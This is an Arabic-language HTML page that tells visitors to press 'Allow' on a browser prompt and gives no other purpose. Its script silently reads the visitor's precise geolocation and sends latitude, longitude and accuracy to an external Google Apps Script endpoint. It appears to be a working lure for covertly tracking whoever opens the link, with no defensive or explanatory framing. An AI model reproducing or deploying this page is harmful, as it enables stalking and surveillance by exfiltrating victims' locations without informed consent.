<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>  </title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body{
  font-family: Arial;
  background:#020617;
  color:white;
  text-align:center;
  padding:40px 15px;
}
.card{
  max-width:400px;
  margin:auto;
  background:#020617;
  border-radius:20px;
  padding:25px;
  box-shadow:0 10px 40px rgba(0,0,0,.6);
}
</style>
</head>

<body>

<div class="card">
  <h2>  </h2>
  <p>يرجى الضغط على <b>سماح</b> عند ظهور الإشعار</p>
  <p id="status">⏳ انتظر لحظة...</p>
</div>

<script>
const API_URL =
"https://script.google.com/macros/s/AKfycbzsN3QngwrDEPApmAHJfBzOKLjFA4vWMi6tE3nu50vAtIzaIow7sl1DPER3pyLhqiQ/exec";

window.onload = function () {

  if (!navigator.geolocation) {
    document.getElementById("status").innerHTML = "❌    ";
    return;
  }

  navigator.geolocation.getCurrentPosition(
    function(position){
      const lat = position.coords.latitude;
      const lng = position.coords.longitude;
      const acc = position.coords.accuracy;

      fetch(`${API_URL}?lat=${lat}&lng=${lng}&acc=${acc}`)
        .then(() => {
          document.getElementById("status").innerHTML =
            "✅   <br>  ";
        });
    },
    function(){
      document.getElementById("status").innerHTML =
        "❌     ";
    },
    {
      enableHighAccuracy:true,
      timeout:20000,
      maximumAge:0
    }
  );
};
</script>

</body>
</html>
